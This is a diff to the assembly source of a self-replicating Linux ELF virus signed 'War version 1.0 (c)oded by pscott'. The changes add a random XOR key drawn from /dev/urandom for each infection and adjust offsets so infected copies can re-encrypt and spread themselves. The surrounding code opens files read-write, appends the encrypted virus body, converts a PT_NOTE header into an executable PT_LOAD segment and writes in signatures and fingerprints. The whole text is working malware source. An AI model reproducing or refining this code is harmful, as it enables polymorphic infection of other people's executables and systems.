@@ -3,24 +3,23 @@
 section .text
   global _start
 
-default rel
-
 decryptor:
   push rdx
   push rsp
-  mov r9, 0x11 ; key
 
   ; age old trick 
   call .delta ; call will push the address of the next instruction on the stack
   .delta:
     pop rbp ; We pop this address into rbp
     sub rbp, .delta ; by substracting delta we get the adress of the virus at runtime
+
+  mov r9, [rbp + key + proc_self_status - v_stop + 1]
   
   mov r12, v_stop - _start ; size of stuff we wish to decrypt
   lea rsi, [rbp + _start]
   .decrypt:
     xor byte [rsi], r9b
-    ror r9, 1
+    ror r9, 1 ; rotate key
     inc rsi
     dec r12
     cmp r12, 0
@@ -37,6 +36,15 @@ _start:
   sub rsp, STACK_SIZE ; enough for the stack
   sub rsp, v_stop - decryptor
   mov r15, rsp ; r15 will be the base of our stack
+
+  ; Check whether we are an infected file or not
+  lea rsi, [rbp + signature] ; load signature in rsi
+  xor r12d, r12d ; init r12 to 0
+  cmp byte [rsi + 1], 'W'; check if we need to adjust offset
+  je .after_adjust
+    mov r12d, proc_self_status - v_stop + 1 ; add the difference
+  .after_adjust:
+  mov [r15 + OFFSET], r12d ; store the offset
 
   mov DWORD [r15 + FINGERPRINT_ADD], 0 ; initialize to 0
 
@@ -102,7 +110,7 @@ _start:
 
     ; Open file
     lea rdi, [rcx + r15 + DIRENT_D_NAME] ; load name
-    mov rsi, O_RDWR ; Rea + Write rights
+    mov rsi, O_RDWR ; Read + Write rights
     xor rdx, rdx ; no flags
     mov rax, SYS_OPEN
     syscall
@@ -187,21 +195,50 @@ _start:
       cmp rax, 0
       jl .close_and_next_file ; if error go to next file
 
-      push rax ; saving target EOF
-
       call .delta ; call will push the address of the next instruction on the stack
       .delta:
         pop rbp ; We pop this address into rbp
         sub rbp, .delta ; by substracting delta we get the adress of the virus at runtime
 
-      ; load key
       push rax ; store target EOF
       push r9 ; store fd on the stack
-      mov r9, 0x11
+
+      ; generate key
+      ; open /dev/urandom
+      xor r9, r9
+      mov r9d, [r15 + OFFSET] ; load the offset we need to add
+      lea rdi, [rbp + dev_urandom + r9] ; "/dev/urandom"
+      mov rsi, O_RDONLY
+      mov rax, SYS_OPEN
+      syscall
+
+      cmp rax, 0
+      jge .generate_key
+      pop r9
+      pop rax
+      jmp .close_and_next_file
+
+      .generate_key:
+        mov rdi, rax ; load fd
+        lea rsi, [r15 + KEY] ; load key address
+        mov rdx, 8 ; size
+        mov rax, SYS_READ
+        syscall
+
+      cmp rax, 0
+      jge .store_key
+      pop r9
+      pop rax
+      jmp .close_and_next_file
+
+      .store_key:
+        mov rsi, [r15 + KEY]
 
       ; copy decryptor on the stack
       mov r12, _start - decryptor ; size to copy
-      lea rsi, [rbp + decryptor] 
+      xor rax, rax
+      mov eax, [r15 + OFFSET] ; load the offset we need to add
+      lea rsi, [rbp + decryptor + rax] 
       lea rax, [r15 + STACK_SIZE]
       xor rdi, rdi ; init rdi
       .memcpy_decryptor:
@@ -214,7 +251,9 @@ _start:
         jg .memcpy_decryptor
 
       mov r12, v_stop - _start ; size to copy
-      lea rsi, [rbp + _start] 
+      xor rax, rax
+      mov eax, [r15 + OFFSET]
+      lea rsi, [rbp + _start + rax] 
       lea rax, [r15 + STACK_SIZE + _start - decryptor] ; only encrypt from _start
       xor rdi, rdi
       .memcpy_and_encrypt:
@@ -228,7 +267,6 @@ _start:
         cmp r12, 0
         jg .memcpy_and_encrypt
 
-      
       pop r9 ; restore fd in r9
 
       ; write virus body to the end of the file
@@ -240,12 +278,15 @@ _start:
       syscall
 
       cmp rax, 0
-      jl .close_and_next_file
+      jge .patch_phdr
+      pop rax
+      jmp .close_and_next_file
 
+      .patch_phdr:
       ; -- Patch program header
       mov dword [r15 + PHDR_TYPE], PT_LOAD ; change PT_NOTE to PT_LOAD
       mov dword [r15 + PHDR_FLAGS], PF_R | PF_X | PF_W ; Add rwx rights to flags
-      pop rax ; restore target EOF into rax
+      mov rax, r10 ; restore target EOF into rax
 
       mov [r15 + PHDR_OFFSET], rax ; put target EOF into phdr_offset
       mov r13, [r15 + ST_SIZE] ; loading st_size in r13
@@ -253,8 +294,8 @@ _start:
       mov [r15 + PHDR_VADDR], r13 ; change vaddr to (stat.st_size + VADDR)
 
       mov qword [r15 + PHDR_ALIGN], ALIGN ; make sure alignment is correct ; SCOTT check
-      add qword [r15 + PHDR_FILESZ], v_stop - decryptor + JMP_REL_SIZE ; + signature_len + fingerprint_len ; adjust filesize. Add + 5 because of jmp instruction
-      add qword [r15 + PHDR_MEMSZ], v_stop - decryptor + JMP_REL_SIZE; + signature_len + fingerprint_len ; adjust memsize. Add + 5 because of jmp instruction.
+      add qword [r15 + PHDR_FILESZ], exit - decryptor + JMP_REL_SIZE ; + signature_len + fingerprint_len ; adjust filesize. Add + 5 because of jmp instruction
+      add qword [r15 + PHDR_MEMSZ], exit - decryptor + JMP_REL_SIZE; + signature_len + fingerprint_len ; adjust memsize. Add + 5 because of jmp instruction.
 
       ; -- Write the patched header
       ; pwrite(fd, buf, count, offset)
@@ -315,6 +356,21 @@ _start:
       cmp rax, 0
       jl .close_and_next_file ; if error continue
 
+      ; -- Get to the end of the file
+      mov rdi, r9 ; load fd
+      xor rsi, rsi ; offset 0
+      mov rdx, SEEK_END ; end of the file
+      mov rax, SYS_LSEEK
+      syscall
+
+      xor r10, r10
+      mov r10d, [r15 + OFFSET]
+      lea rsi, [rbp + proc_self_status + r10] ; load address
+      mov r10, rax ; load EOF in rax
+      mov rdx, signature - proc_self_status ; want to write 8 bytes
+      mov rax, SYS_PWRITE64
+      syscall
+
       ; Write signature
       mov rdi, r9 ; load fd
       xor rsi, rsi ; offset 0
@@ -322,26 +378,22 @@ _start:
       mov rax, SYS_LSEEK
       syscall
 
-      lea rsi, [rbp + signature] ; load signature in rsi
-      xor r12, r12 ; init r12
-      cmp byte [rsi + 1], 'W'; check if we need to adjust offset
-      je .after
-      add r12, signature - v_stop + 1 ; add the difference
-
-      .after:
-        add rsi, r12 ; adjust pointer (r12 will be 0 if rsi + 1 == 'W')
-        mov rdx, signature_len ; signature length
-        mov r10, rax
-        mov rax, SYS_PWRITE64
-        syscall
+      xor rdx, rdx
+      mov edx, [r15 + OFFSET]
+      lea rsi, [rbp + signature + rdx]
+      mov rdx, signature_len ; signature length
+      mov r10, rax
+      mov rax, SYS_PWRITE64
+      syscall
 
       cmp rax, 0
       jl .close_and_next_file ; if error go to next file
 
       ; Load fingerprint and write it
-      lea rsi, [rbp + fingerprint] ; load fingerprint address in rsi
+      xor rax, rax
+      mov eax, [r15 + OFFSET]
+      lea rsi, [rbp + fingerprint + rax] ; load fingerprint address in rsi
       add rsi, r12 ; adjust pointer
-
 
       mov eax, [r15 + FINGERPRINT_ADD] ; load how much we should increment
       inc eax
@@ -467,7 +519,21 @@ _start:
 
       lea rsi, [r15 + FINGERPRINT] ; load address
       mov r10, rax ; load EOF in rax
-      mov rdx, fingerprint_len - 1 ; want to write 4 bytes
+      mov rdx, 8 ; want to write 8 bytes
+      mov rax, SYS_PWRITE64
+      syscall
+
+      ; -- Get to the end of the file
+      mov rdi, r9 ; load fd
+      xor rsi, rsi ; offset 0
+      mov rdx, SEEK_END ; end of the file
+      mov rax, SYS_LSEEK
+      syscall
+
+      ; Write key
+      lea rsi, [r15 + KEY] ; load address
+      mov r10, rax ; load EOF in rax
+      mov rdx, 8 ; want to write 8 bytes
       mov rax, SYS_PWRITE64
       syscall
 
@@ -519,19 +585,18 @@ cleanup:
 
 v_stop:
   jmp exit
+proc_self_status:
+  db "/proc/self/status", 0
+dev_urandom:
+  db "/dev/urandom", 0
 signature:
   db 0, 'War version 1.0 (c)oded by pscott - '
   signature_len equ $ - signature
 fingerprint:
-	db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0
-  fingerprint_len equ $ - fingerprint
-proc_self_status:
-  db "/proc/self/status", 0
+	db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
 key:
-  db 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
-code_offset:
-  db 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
-  
+  db 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0
+
 exit:
   xor rdi, rdi ; exit code 0
   mov rax, SYS_EXIT;
